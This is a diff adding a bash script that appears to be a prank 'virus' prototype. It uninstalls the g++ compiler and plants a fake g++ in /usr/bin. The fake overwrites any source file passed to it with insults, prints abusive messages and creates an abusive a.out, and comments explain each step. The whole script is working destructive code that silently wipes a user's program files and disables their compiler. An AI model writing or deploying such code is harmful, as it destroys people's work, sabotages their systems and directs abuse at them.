@@ -1,0 +1,50 @@
+#!/bin/bash
+
+# STILL PROTOTYPE PHASE . BASIC FUNCTIONALITY ACHIEVED 
+
+# Approach 2
+sudo apt-get purge --auto-remove -y g++  >> virusReport
+
+
+# Creating the fake g++
+echo '#!/bin/bash' >> g++
+echo ' echo $1 is a horrible program' >> g++
+echo ' echo You are a terrible programmer !' >> g++
+echo ' echo  I told you that is a shitty program ! > $1 ' >> g++
+echo "  echo ' echo ' Hey dumbass , this program is not going to work ! ' ' >> /home/user1/Scripts/a.out " >> g++
+echo ' chmod +x  /home/user1/Scripts/a.out ' >> g++
+chmod +x g++
+sudo mv g++ /usr/bin/
+
+# Approach 1
+echo
+echo $PATH
+
+TEST=$(pwd)
+echo Currently working in $TEST
+
+
+
+
+
+# IMPROVEMENTS :
+# DONE 1) Remove real g++ from /usr/bin/g++ as revealed by command => which g++
+#    and plant this g++ in that place , probably eliminating need to change PATH
+
+# DONE 2) When compiling with this new fake g++ , generate a.out file and chmod +x a.out
+
+# DONE 3) Add a comment in program file given as argument
+#	Never seen a crapier program , you moron 
+#	- Your's sincerely ,
+#	  GNU g++ compiler 
+
+
+
+
+# EXPLANATION
+# This script uninstalls g++
+# Then it creates a fake g++ , makes it an executable
+# Then it moves this fake g++ to /usr/bin
+# Then whenever g++ is called , this g++ gets executed .
+# The fake g++ replaces contents of the program given as argument with random abuses
+# It also gives abusive output on screen . It also creates an a.out file which still prints abuses
